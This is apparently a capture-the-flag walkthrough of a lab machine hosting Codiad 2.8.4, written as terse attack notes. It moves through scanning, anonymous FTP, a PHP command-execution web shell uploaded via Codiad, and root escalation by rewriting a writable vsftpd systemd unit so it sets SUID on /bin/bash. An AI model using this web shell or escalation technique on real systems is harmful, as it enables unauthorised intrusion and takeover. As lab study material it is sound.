# step 0 : 
target IP : 10.64.135.46
my IP : 10.64.143.64

# step 1 : port scan 
open ports : 22, 80, 21, 62337


# step 2 : service scan : 
21 : VSFTPD 3.0.3 ftp anon login

22 : openssh 7.6p1 ubuntu

80 : apache httpd 2.4.29 ubuntu ( it works )

62337 : apache httpd 2.4.29 

# step 3 : searchsploit 
vsftpd 3.0.3 : denial of service
openssh < 7.7 : user enumeration 
apache < 2.4.38 : log rotate LPE


# step 4 : anonymous ftp 
```bash
ftp 10.64.135.46
```
    - found folder "..."
    - found file ".../-"
```ftp
cd ...
get -
```

```bash
cat ./-
# Hey john,
# I have reset the password as you have asked. Please use the default password to login. 
# Also, please take care of the image file ;)
# - drac.
```


# step 5 : First website 62337
title : codiad 2.8.4
```bash
searchsploit codiad 2.8.4
```
```bash
gobuster dir -u http://10.64.135.46:62337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -r 
- /themes               (Status: 200) [Size: 1136]
- /data                 (Status: 200) [Size: 1949]
- /plugins              (Status: 200) [Size: 942]
- /lib                  (Status: 200) [Size: 1178]
- /js                   (Status: 200) [Size: 3702]
- /components           (Status: 200) [Size: 3943]
- /languages            (Status: 200) [Size: 4614]
- /workspace            (Status: 200) [Size: 946]
```

google : codiad default login
> drop : exploit db RCE authenticated : https://www.exploit-db.com/exploits/50474

nothing about a default credential


# step 6 - password guessing
username : john and drac ( by the ftp )
password tested : admin, 123,1234,123456789,password,root,toor

# step 7 : RCE 
### 1 - generate web shell
```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```
### 2 - Create new project on codiad
Projects > + >
- Project Name : <Anything>
- Folder Name : /var/www/html/codiad

### 3 - Upload web shell on codiad
Projects > <Anything>
Explore > test > ( right click ) > upload files

### 4 - Enumeration from web shell
```bash
ls -la /home
ls -la /home/drac
cat /home/drac/.bash_history
ssh drac@<server> # with mysql password
```

# Step 8 - LPE : 
### 1 - list current LPE misconfig
```bash
sudo -l # shows a sudo command : (all:all) sudo /usr/sbin/service vsftpd restart
```
### 2 - Find service file :
```bash
find / -name "vsftpd.service" -ls 2>/dev/null # shows `/lib/systemd/system/vsftpd.service` as writable by group drac
```

### 3 - Exploitation
```bash
cat << 'ENDL'> /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/chmod +s /bin/bash
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
ENDL
systemctl reload-deamon
/usr/sbin/service vsftpd restart
```

### 4 - flag
```bash
bash -p
cat /root/root.txt
```